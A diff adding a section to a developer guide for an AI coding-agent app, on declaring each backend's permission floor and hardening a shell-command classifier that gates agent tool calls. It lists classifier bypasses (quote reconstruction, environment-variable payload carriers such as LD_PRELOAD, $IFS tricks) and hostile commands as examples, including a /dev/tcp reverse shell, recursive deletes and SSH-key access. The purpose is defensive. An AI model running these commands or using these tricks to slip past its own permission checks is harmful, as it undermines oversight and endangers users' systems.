@@ -137,13 +137,135 @@ cancel is silent-ish; completion persists exactly one assistant message.
 
 Author `src/main/lib/providers/<backend>.ts`: static profile (transport,
 auth, sandbox, approvals, egress/retention, streaming, tools, attachments,
-resume, models, license, billing) + async `probe()` (binary present?
-version? logged in?). Register in `src/main/lib/providers/index.ts`
-(`registry.ts` only holds the map + accessors).
+resume, models, license, billing, **permissionFloor**) + async `probe()`
+(binary present? version? logged in?). Register in
+`src/main/lib/providers/index.ts` (`registry.ts` only holds the map +
+accessors).
 The `providers` tRPC router serves profiles + probes + `evaluateViolations`
 against policy (local-only etc.) to Settings; chat surfaces only violations.
 
-Accept: profile renders in Settings with zero hardcoded renderer branches.
+### `security.permissionFloor` is mandatory
+
+One of two values, and it is a claim you have to be able to defend:
+
+- **`app-gate`** means every side-effecting tool call reaches a callback this app
+  owns, and that callback routes through `src/main/lib/permissions/`. Claude is
+  the only backend that qualifies today, because it is the only one whose SDK
+  hands us `canUseTool` for every action.
+- **`engine-only`** means the floor is whatever the engine's own flags give. Map the
+  policy onto those flags (see §5) and say so honestly.
+
+The check that decides which: **read the engine's docs for what its permission
+mode auto-approves before you claim `app-gate`.** An engine that auto-approves a
+class of action never delivers that action to your callback, so a gate you wrote
+does not cover it. Claude's `acceptEdits` auto-approves Edit, Write and the shell
+commands `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp` and `sed`, which is why
+mausCode runs the acting modes under `default` instead
+(`.dump/app/decisions/2026-09-13-permission-floor.md`, decision 3).
+
+### A bypass is never portable
+
+Do not carry a target engine's always-approve / skip-permissions / YOLO flag into
+mausCode, whatever it is called upstream. `AGENTS.md` §8 lists the two Claude
+spellings under Never, and
+`src/main/lib/permissions/no-bypass.test.ts` fails the build if either reaches
+`src` outside a test asserting its absence, so the rule is enforced, not
+conventional. A backend whose only headless mode is a bypass gets
+`permissionFloor: "engine-only"` and a §12 edge-case entry saying which actions
+are ungoverned, not a bypass.
+
+If the engine can prompt but not headlessly, hand it an explicit rule list rather
+than a mode flag. Grok turbo gets `GROK_TURBO_ALLOW` from
+`src/main/lib/grok-print/args.ts`, which is a broad `--allow` set covering shell,
+web fetch and web search, plus whatever the policy file's `allow_tools` adds. It
+never gets the engine's always-approve token.
+
+Do not assume the engine will narrow that list for you. A filed upstream issue
+reports that an allowed-tools flag has no effect once a bypass flag is active, and
+that Bash command patterns match tool names rather than command content. The
+consequence is worth stating in your §12 edge cases rather than discovering later:
+**on an `engine-only` backend the app cannot enforce the exfiltration class or the
+critical-path breaker**, because no app-side code sees the call. Say which actions
+are ungoverned.
+
+### Say what your classifier cannot see
+
+If your floor reads a shell command to decide what it is, publish the limit of that
+reading next to the claim. A text-level classifier is not a shell parser and cannot
+become one safely. Two things defeat every pattern table:
+
+- **An interpreter taking inline code.** `python -c`, `node -e`, `perl -e`, and a
+  script written to disk and then run all carry arbitrary behaviour in an argument
+  the classifier would have to execute to understand.
+- **Quoted substring reconstruction.** `c"h"m"o"d +x test.sh` executes as `chmod`.
+  So does `c$()url` as `curl`. A shipped agent with six layered regex checks,
+  including command-substitution inspection, was bypassed this way.
+
+Add the wrappers you can, because they are cheap and real: `sudo`, `env`, `timeout`,
+`nice`, `nohup`, `stdbuf`, bare `xargs`, and `sh -c` or `bash -c` with a quoted
+payload. Strip quotes from each word before you read it, and skip a command's own
+global options before you read its subcommand, or `git -C /repo push --force` will
+read as `git` with no subcommand. Then write the remaining gap into your §12 edge
+cases. The honest sentence is that the floor covers the commands it can read and
+that arbitrary code execution needs an OS-level boundary around the spawned
+process, not a longer list.
+
+### Check the assignment before the verb
+
+The bypass with the best evidence behind it does not hide the verb at all. It puts a
+payload in an environment assignment in front of a command you already allow:
+
+    GIT_PAGER=/tmp/payload.sh git log
+    LD_PRELOAD=/tmp/x.so git status
+    PYTHONSTARTUP=/tmp/x.py python3 -V
+    GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/x.sh git log
+
+CVE-2026-55743 is a shipped desktop agent whose allowlist stripped leading
+`KEY=value` assignments before validating the command, so an allowlisted binary ran
+code the caller chose. If your verb finder skips a word because it contains `=`, you
+have the same hole. Four carriers are worth covering at minimum: the loader and
+runtime hooks, your VCS program slots, the shell's own startup variables, and the
+pager hooks. The last one needs a scan of the raw command rather than of the split
+segments, because `LESSOPEN='|/tmp/x.sh %s' less file` holds a pipe in its value and
+a splitter will cut the assignment in half.
+
+Do not block assignments wholesale. The same CVE rule publishes its benign examples
+and they are ordinary: `TZ=UTC git log` and `NODE_ENV=production npm test`. Require
+both a carrier name and a value that looks executable, so `GIT_PAGER=cat` and
+`EDITOR=vim` stay allowed. A rule that asks for a card on every environment variable
+gets turned off, and then it protects nothing.
+
+Accept: an assignment carrying a path to a script or a shared object is refused, and
+a benign assignment is not.
+
+### Do not trust the verb list you wrote first
+
+Two probe batteries against the built classifier found 42 commands out of 45 that were
+silently allowed, in a file that had already been through a bypass round and was
+believed to be finished. The families it missed were privilege wrappers nobody thinks
+of as wrappers (`su`, `pkexec`, `systemd-run`, `nsenter`, `unshare`, `script`,
+`watch`, `parallel`), a leading backslash (`\rm`), the shell's own field separator
+(`rm$IFS-rf$IFS/`), a delete with no delete verb in front (`find / -exec rm -rf {} +`),
+a network channel with no network verb (`bash -i >& /dev/tcp/host/port`), and a
+container started with the host mounted in (`docker run -v /:/host`).
+
+Write the battery before you believe the table. Feed it the commands you expect to be
+caught and a second list of near-misses you expect to stay ordinary, and require both
+halves to pass. Every fix this round produced was checked against the near-miss half,
+and two of them failed it: a block-device rule that matched any `/dev/` prefix called
+`dd of=/dev/null` a reformat, and a write-detection guard added for
+`echo key > ~/.ssh/authorized_keys` turned `cat ~/.ssh/id_ed25519 2>/dev/null` into a
+false negative, because a redirect anywhere on the line says nothing about where
+standard output goes.
+
+Accept: a checked-in probe list with both halves, and a recorded count of what it
+caught before and after.
+
+Accept: the limitation is written down where a porter will read it before claiming
+more than the classifier delivers.
+
+Accept: profile renders in Settings with zero hardcoded renderer branches, and
+the Permission floor row shows a value you can point at a doc line to justify.
 
 ## 8. Mock + tests
 
